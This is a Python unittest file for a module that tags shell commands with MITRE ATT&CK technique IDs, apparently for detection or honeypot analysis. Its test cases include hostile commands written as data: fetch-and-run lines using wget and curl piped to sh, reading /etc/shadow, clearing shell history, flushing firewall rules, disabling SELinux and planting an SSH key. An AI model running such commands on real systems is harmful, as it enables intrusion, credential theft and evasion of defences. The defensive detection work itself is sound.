"""Rule tests for app/mitre.py. No database or web framework needed:
    python -m pytest tests/test_mitre.py
"""
import re
import time
import unittest

from app import mitre


class MitreRuleTests(unittest.TestCase):
    def ids(self, cmd):
        return mitre.techniques_for_command(cmd)

    def test_examples(self):
        cases = {
            "uname -a": ["T1082"],
            "cat /proc/cpuinfo | grep name | wc -l": ["T1082"],
            "whoami": ["T1033"],
            "id": ["T1033"],
            "cat /etc/passwd": ["T1087.001"],
            "cat /etc/shadow": ["T1003.008"],
            "cd /tmp; wget http://1.2.3.4/a.sh; chmod +x a.sh; sh a.sh": ["T1059.004", "T1105", "T1222.002"],
            "curl -s http://x/y | sh": ["T1059.004", "T1105"],
            "history -c": ["T1070.003"],
            "rm -rf /tmp/.x": ["T1070.004"],
            "echo 'ssh-rsa AAA' >> ~/.ssh/authorized_keys": ["T1098.004"],
            "crontab -l": ["T1053.003"],
            "ps aux | grep xmrig": ["T1057", "T1496.001"],
            "ifconfig": ["T1016"],
            "ip a": ["T1016"],
            "netstat -tnlp": ["T1049"],
            "ls -la": ["T1083"],
            "iptables -F": ["T1686"],
            "setenforce 0": ["T1685"],
            "unset HISTFILE": ["T1690"],
            "echo YmFzZQ== | base64 -d": ["T1140"],
            "python3 -c 'print(1)'": ["T1059.006"],
            "/bin/busybox wget http://x": ["T1105"],
            "sudo reboot": ["T1529", "T1548.003"],
            "nmap -p 22 10.0.0.0/24": ["T1046"],
            "useradd bob": ["T1136.001"],
            "ssh root@10.0.0.5": ["T1021.004"],
        }
        for cmd, want in cases.items():
            self.assertEqual(self.ids(cmd), sorted(want), cmd)

    def test_no_false_positives_on_lookalikes(self):
        for cmd in ("echo hello", "", "   ", "ssh-keygen -t rsa", "idle", "widget", "lsblkx", "dated", None):
            self.assertEqual(self.ids(cmd), [], repr(cmd))

    def test_every_rule_points_at_a_catalog_entry(self):
        for name, tech, pattern, scope in mitre.RULES:
            self.assertIn(tech, mitre.CATALOG, name)
            self.assertIn(scope, ("segment", "full"))
            re.compile(pattern)
        for tid in mitre.EVENT_TECHNIQUES:
            self.assertEqual(mitre.CATALOG[tid]["basis"], "event")

    def test_ids_and_urls(self):
        for tid in mitre.CATALOG:
            self.assertRegex(tid, mitre.TECH_PATTERN)
        self.assertEqual(mitre.technique_url("T1110.001"), "https://attack.mitre.org/techniques/T1110/001/")
        self.assertEqual(mitre.technique_url("T1082"), "https://attack.mitre.org/techniques/T1082/")

    def test_hostile_input_is_fast(self):
        start = time.time()
        mitre.techniques_for_command(("a;" * 3000) + "x" * 4000 + " | " * 200)
        mitre.techniques_for_command("sudo " * 2000 + "ls")
        self.assertLess(time.time() - start, 1.0)

    def test_rules_for_returns_pattern_or_event(self):
        self.assertEqual(mitre.rules_for("T1078")[0]["scope"], "event")
        self.assertTrue(all(r["pattern"] for r in mitre.rules_for("T1082")))


if __name__ == "__main__":
    unittest.main()
